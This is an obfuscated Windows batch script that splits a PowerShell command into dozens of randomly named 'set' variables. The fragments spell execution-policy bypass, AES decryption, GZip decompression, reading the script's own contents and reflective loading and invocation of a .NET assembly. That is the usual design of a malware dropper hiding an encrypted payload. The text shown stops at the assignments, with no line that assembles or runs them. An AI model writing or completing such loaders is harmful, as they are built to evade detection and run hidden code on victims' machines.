@echo off
set "VjXvjtuRCV=Bmor"
set "byJpYURhcm=YxVw"
set "XDewzCTPnB=.Mem"
set "GxVuNGkTYY=..-1"
set "CFrvVFtCAk=Conv"
set "sPSCjOWfRp=::('"
set "oynTydvrFC=w.Su"
set "mAYgnRkvTk=comm"
set "qnTZRCFnar=oint"
set "xSsEBohcNG=oL'["
set "SftkEWDRWD=$smg"
set "sFKnbHdOpb=dj0C"
set "pnErycHQHB=iron"
set "MGEqwmSQoT=('%~f0'"
set "fFZLJcnkzu=-ep "
set "JnKlZQANlh=morF"
set "HHzLrJRZOD=PrP."
set "uEFwieDMml=se()"
set "IRRxBuczds=y]::"
set "RqnnujNTEC= = $"
set "PbDitWrWPM=pose"
set "FBdvjhJeSY=ment"
set "aTcwLhwEpm=lBlo"
set "wJDoLtralH=and "
set "nIDcRAvbZa=[Sys"
set "NSidbeZpMb=mory"
set "aEBOSosyZC=onve"
set "GeKtZchlFd=eam("
set "ghIQkHvgdA=y.Pa"
set "eTSGTxrdsE=ct S"
set "sFAHFhUqow=pres"
set "qvDvVWsZOW=gth)"
set "sVjUIVwXBf=:: '"
set "ViyoQFDJbB=gjYA"
set "qeMiJxQPSs=-nop"
set "oFtlOzYPrp=ispo"
set "OXgrMBMLby=yTo("
set "kPOchvOAbK=rtS4"
set "dtNOGzrbgo=V = "
set "LBEtwfkTnC=Syst"
set "uBnKYIIDUT=$PUX"
set "EdTtdkgwwv=RG.I"
set "kShtMYqBsH=ach "
set "IfZayAcpjk='0Pg"
set "ClUXlWBXmy=Star"
set "IJsDwFbjRK=vx ="
set "uLeBIRrCTM=fore"
set "qwxpaWbOFq=orF'"
set "DkfKiqIHrC=PUXR"
set "ruNVkGHeiZ=; };"
set "tWShLpiRrN= = $"
set "dANRdDYiZI=)($s"
set "MBZSZtAavu=VtXy"
set "QfUnHQiIOK=yokR"
set "eBzbzWwbSz=mgEp"
set "FrhYxyPIWo=ert]"
set "SKJakJNSCE=6esa"
set "imSJAVuQqc='[-1"
set "bXYfhykygg=-joi"
set "TlbYycRUiF=m.Re"
set "tONhrtNAtS=ion."
set "pXZxrCmYuy=.Len"
set "ovoVHeLosw=tem."
set "ofQEkOFeeS=urit"
set "ZTtRQRjtHr=yste"
set "vUrqdtqxCs=Rcw."
set "xBFjoXfqcE=z.En"
set "mpxHWrnBlN=tem."
set "SemTSfPFmu=mgEp"
set "UWOtSHdYjY=rity"
set "rJMJaySqnV=k; }"
set "wVubvGtHzj=1] -"
set "pnySLDfSCJ=ect "
set "KtoWjhdSla=join"
set "cdxRFvLFhN=JORc"
set "bBpiaLXVaK=:('g"
set "kCPtrKzCpN=hy.A"
set "TmnCidNgqg=]::("
set "zCWZHOSuhM=comp"
set "YSoKVzxVlZ=neEb"
set "RhxzRIXtWD=Comp"
set "iJzNIkIGsL=Invo"
set "zRbrMhsDPW=vx.T"
set "ndhTalptLZ=ress"
set "lPUkediyZd=Secu"
set "LWXQzPOHEZ=PTtG"
set "HyAZtsaXJH=Mode"
set "hecxjgKBvE=($JO"
set "pdBuSugKdo=PxEW"
set "KWsfSdYAoo='[-1"
set "SKZwFDBxIH=gMod"
set "RavdzOSxPp=raph"
set "CXPlXjyddR=);$P"
set "nxvZpQnQIz=Ep);"
set "KqhccxnYxg=$uPK"
set "FReirYsdCe=.GZi"
set "gfaFiMScUC=RV ="
set "DxmVYmRuKY=ose("
set "urwckhbEJK=p = "
set "bSlnQjOeDS=daeR"
set "CWwaqPPVtg=flec"
set "OEWzxxYuVm=lit("
set "JEJBFOimvP=sion"
set "GkuESqjvPP=;$OS"
set "ozwxfYDMuo=);$y"
set "HwscaLbQMA=();$"
set "sexaEmSzFR=smgE"
set "YVugvQUunY=tsWi"
set "ENCkGQGTle=stem"
set "rbYnnKfUMz=ck($"
set "biircxpEjv=ddin"
set "vLwhYlBPWT=New-"
set "kAiEXPlpRM=le  "
set "fXxvkjNMQj=okRG"
set "GJYkaPqAOt=ress"
set "lMmpqUzRMi=('da"
set "MMnljEudIz=.Dis"
set "WfnlwORrDU=[Sys"
set "NKTiIibIKe=ecry"
set "PhNtGTMysp=ne);"
set "ugUoNhmpnq=eMVs"
set "ClZmThiSea= = N"
set "fZRSJeTIKx= [Sy"
set "OhWnAyWYaS=grap"
set "nQiitqvKcg=bypa"
set "ugUoYIcORZ==');"
set "oIwFohsXCP=.Ass"
set "MfClgxJssc=smgE"
set "RGbtSqoEJm=] -j"
set "uUYWQnRPEV=PELy"
set "lGWPUduqhy=ionM"
set "yVWDzLnnhE=stem"
set "minhugJxKi=O.Me"
set "axHkkxOsYN=ptog"
set "DSPhZpoTWK=esMa"
set "GwaXkinhMk=ateD"
set "hlWkAsghCn=vz.T"
set "VDyGERCBUj=('%*'"
set "OEHIyQznWm=-joi"
set "ORFZwHQnuf= = ["
set "XSGJzSxhAm=..-1"
set "mYvuWAuFTe=vert"
set "hEsPxGQRDY=am;$"
set "VnOZuTwTKS=null"
set "cCWqCrrRhX=$OSi"
set "qfJdGwPWrn=m(, "
set "BpgJBvJvbU=File"
set "suVaSwDBKq== [S"
set "uLPHkrzJIW=CFxo"
set "uPjbPHtosV=Comp"
set "odnAGwXAiI=ay()"
set "gZQXIzyUWZ=ypto"
set "jHBZdrJXgZ=.IO."
set "pOqpaLeoUH=$uPK"
set "migBuAAsqH=$nxP"
set "RogbTNFazc=zHhH"
set "OYXZgjlCNX= '')"
set "lPQtMqOSpQ=gnir"
set "VwadiRzWut=ode]"
set "mDXJuLfrtZ=PKvx"
set "acVMhfmPvd=s75K"
set "TywrUxGJRu=oryS"
set "mByPqJerhB=n ''"
set "pLhfdGkCgQ=nage"
set "uuncNFmzer=join"
set "qwiwaWpblP=;$nx"
set "ZgqhKWtomt=$yok"
set "lJbibvhmlH=7;$y"
set "dwQZpYQXhp=ELy."
set "PfouzmFnqw=yste"
set "nZbrCGqOwx=tryP"
set "VVCULOmhbA=oin "
set "UOOaSPuJqq=p, 0"
set "vcnbBHYNDC=pher"
set "vpQsoUiyjx=tS46"
set "WpypNcfDbr=();$"
set "vNuUKJXdgC=Disp"
set "oexAMaRsSO=16] "
set "wcTJZMftPQ=em.C"
set "gqVMbOnMkD=($JO"
set "FIsfOnwtQW=embl"
set "NOWzaILFBH=[]] "
set "AeSgAMIlTe=okRG"
set "eRnZJsgYJh=[Sys"
set "JLcGMjvlBR=Fina"
set "BFFWuNMOlg=esaB"
set "twaiwdIzSB=.Cry"
set "EHDWnCpsee=th('"
set "JwgcxaabKC=form"
set "XziBUgRfHT=tion"
set "tzsKxgTkkn=rt]:"
set "zugPUlkTGi=RmAx"
set "oxVcyLRPIo=]::N"
set "RoOvXNSccA=bjec"
set "lkJCmvrsMC=]::C"
set "xHIixJsMnl= if "
set "GjTigcMzxA=OoPJ"
set "iJtksyidPY=zuZI"
set "XufgxdGjqt=$smg"
set "zfTIbizsFv=New-"
set "nNcSGdUGiq=L4Yi"
set "iAhVxdBfCF=Secu"
set "ZhpoOarHOa=trea"
set "mpzLFzzlUn=)) {"
set "FGPnDKpjXJ=('Tg"
set "EXhpDQWCwl=106u"
set "qRvvBTOQaC=e]::"
set "RdVqdhbpRP=pStr"
set "csLNrzcrEt= [Sy"
set "IpxUQcUkEt=ress"
set "ADtOhDcZpH=.Cry"
set "wfTrezskwT=ew-O"
set "MPGWFDLbDK=ing("
set "SVjCPzptOh=saBm"
set "kSugLyNlEy=yste"
set "MCWxXBvZPJ=m.IO"
set "ZfPIfsUnSA=.Cop"
set "XDcRGegxCP=);$W"
set "FGvRRfqwVv=g = "
set "DvdUtVUzsO=ring"
set "wcEwBjfSOK=tem."
set "YVgrbpaqST=rans"
set "hMEWVDkxGX=d;$y"
set "MLUKjXKilS=S46e"
set "Kvsmbvaggz=.Cre"
set "bOKhSGnVOF=.-16"
set "rblFmrObpB=p = "
set "szVrEmVCTl=PVtX"
set "dLShlPMtBR=BC;$"
set "rSqKOrvvTm=ke($"
set "eTTkESwcPT=-4] "
set "naMwIOyBeT=n ''"
set "DWsmTaCkET=smgE"
set "kPFtVtERdY=ivz "
set "NwXwRPVhkU=ss -"
set "qGabyWFtOE=ddin"
set "TQmOacpdXd=brea"
set "niLOIpRaXs=Obje"
set "LoYraxhhfF=vx);"
set "kQxtGxWYyT=)($T"
set "KDpRiksKPf=G.Pa"
set "YlltrbTbdi=Ebz "
